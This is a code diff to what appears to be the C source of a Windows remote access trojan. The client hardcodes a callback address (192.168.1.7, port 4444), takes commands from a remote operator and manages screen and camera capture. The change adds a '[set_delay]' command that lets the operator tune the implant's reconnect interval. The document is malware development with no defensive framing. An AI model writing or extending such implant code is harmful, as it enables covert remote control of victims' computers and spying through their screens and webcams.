@@ -17,7 +17,7 @@
 
 #define HOST "192.168.1.7"
 #define PORT 4444
-#define RECONNECT_DELAY 5000
+int g_reconnect_delay = 5000;
 
 SOCKET g_sock = INVALID_SOCKET;
 HANDLE g_send_mutex = NULL;
@@ -109,6 +109,9 @@ void handle_command(void* arg) {
         closesocket(g_sock);
         /* g_sock = INVALID_SOCKET causes main recv loop to exit, triggering reconnect */
         g_sock = INVALID_SOCKET;
+    } else if (strncmp(cmd, "[set_delay]", 11) == 0) {
+        int delay = atoi(cmd + 11);
+        if (delay > 0) g_reconnect_delay = delay;
     }
 
     free(ca);
@@ -147,7 +150,7 @@ int main() {
 
         if (connect(g_sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
             closesocket(g_sock);
-            Sleep(RECONNECT_DELAY);
+            Sleep(g_reconnect_delay);
             continue;
         }
 
@@ -200,7 +203,7 @@ int main() {
         closesocket(g_sock);
         if (g_screen_stop) SetEvent(g_screen_stop);
         if (g_camera_stop) SetEvent(g_camera_stop);
-        Sleep(RECONNECT_DELAY);
+        Sleep(g_reconnect_delay);
     }
 
     free(info);
